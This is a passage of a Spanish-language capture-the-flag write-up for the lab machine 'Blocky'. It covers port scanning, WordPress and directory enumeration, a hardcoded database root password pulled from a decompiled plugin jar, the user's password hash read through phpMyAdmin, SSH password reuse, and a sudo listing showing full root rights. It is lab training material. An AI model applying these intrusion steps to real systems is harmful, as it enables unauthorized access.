# Initial Scan
```nmap
21/tcp    open  ftp       ProFTPD 1.3.5a
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open  http      Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
```

# Enum
## HTTP
### Gobuster
```
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/plugins (Status: 301)
/server-status (Status: 403)
/wiki (Status: 301)
/wp-admin (Status: 301)
/wp-content (Status: 301)
/wp-includes (Status: 301)
```
### Wpscan
```
[i] User(s) Identified:

[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

### Plugins

Vine buscando cobre y encontre oro :v , iba a checekar por plugins vulnerables y sin embargo encontre un archivo.jar

Descargamos, decompliamos 
```
http://www.javadecompilers.com/processing
```
Y analizamos
```
public BlockyCore() {
        this.sqlHost = "localhost";
        this.sqlUser = "root";
        this.sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
    }
```

### Phpmyadmin

Como vimos antes haciendo gobusting encontramos phpmyadmin funcionando en el servidor, usamos las creds de antes y entramos sin problemas 

Pasamos al modo de SQL
```SQL
SELECT * FROM wp_users WHERE user = "notch";
```
Como respuesta a esta query obtenemos las credenciales de notch
```
notch:$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/
```
Faltarían dehashearlas, pero vamos a comprobar si las contraseñas se han usado en el ssh para algun usuario y efectivamente el user notch tiene la misma pass que en el phpmyadmin

# Privesc

```
sudo -l

Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```
